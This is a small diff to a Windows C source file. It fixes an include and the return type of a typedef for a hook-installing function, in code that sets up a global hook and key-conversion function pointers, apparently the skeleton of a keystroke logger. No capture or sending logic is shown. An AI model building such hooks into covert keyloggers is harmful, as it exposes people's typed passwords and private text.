@@ -5,7 +5,7 @@
 #include <stdbool.h>
 #include <time.h>
 
-#include "io.c"
+#include "io.h"
 
 // Define global hook
 HHOOK hHook = NULL;
@@ -14,7 +14,7 @@ HHOOK hHook = NULL;
 HANDLE h_thread;
 
 // define function definitions
-typedef int(WINAPI *WinHookProc)(int something, HOOKPROC, HINSTANCE, DWORD);
+typedef HHOOK(WINAPI *WinHookProc)(int something, HOOKPROC, HINSTANCE, DWORD);
 typedef int(WINAPI *WinMessageProc)(LPMSG, HWND, UINT, UINT);
 typedef int(WINAPI *WinConvProc)(UINT, UINT, BYTE[], LPWORD, UINT);
 typedef int(WINAPI *WinNextHookProc)(HHOOK, int nCode, WPARAM, LPARAM);
